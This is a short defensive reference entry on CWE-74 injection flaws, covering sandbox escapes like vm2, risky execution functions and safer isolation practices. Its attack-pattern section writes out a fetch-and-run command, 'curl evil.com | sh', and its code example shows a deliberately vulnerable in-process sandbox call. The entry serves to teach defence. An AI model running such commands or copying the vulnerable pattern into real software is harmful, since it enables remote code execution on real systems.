# CWE-74: Injection (parent class)

## Plain-English explanation
Untrusted input crosses from one language into another — from your code into a shell, a SQL engine, a template renderer, an HTML page, or another interpreter — without being escaped for that target. The interpreter then treats parts of the input as instructions instead of data. CWE-74 is the umbrella; CWE-77, 78, 79, 89, 94 are the famous children.

## Typical attack pattern
A sandbox library (like vm2) is supposed to run untrusted JavaScript safely. A bug in its `Proxy` handling lets the guest code reach out into the host's globals and run any command — `require('child_process').execSync('curl evil.com | sh')`. The "different interpreter" here is the sandbox boundary itself; injection means the guest crossed it.

## Reachability hints
- Any function whose job is to **execute** strings: `eval`, `Function(...)`, `vm.runInContext`, `vm.runInNewContext`, `child_process.exec*`, `os.system`, `subprocess.run(..., shell=True)`, `pickle.loads`, `yaml.load` (unsafe loader).
- Template engines fed user input as the template body (vs the data): `Handlebars.compile(userInput)`, `Jinja2.Template(userInput)`.
- Sandboxes that promise isolation: `vm2`, `safe-eval`, `isolated-vm`, `pyodide`, JS realms. Their advisories almost always live here.

## Common workarounds when a bump is blocked
- Never feed untrusted strings into an interpreter. If you must execute user code, isolate at a **process** boundary (a subprocess in a container, a wasm runtime), not a library boundary.
- Use parameterized APIs instead of string interpolation: prepared statements for SQL, `execFile`/`spawn` (no shell) instead of `exec`, structured data for templates.
- For sandbox libs specifically: assume any sandbox-escape advisory is real and unfixable in the library itself — move the workload out of process.

## Concrete code example

```js
// Vulnerable — runs untrusted code in-process
const { VM } = require('vm2');
new VM().run(req.body.userScript);   // sandbox escape → host RCE

// Safe — execute in a real isolation boundary
const { spawn } = require('child_process');
const child = spawn('node', ['-e', '/* fixed runner */'], {
  // run inside a gVisor / Firecracker / Docker container in prod
  stdio: ['pipe', 'pipe', 'pipe'],
});
child.stdin.write(req.body.userScript);
child.stdin.end();
```
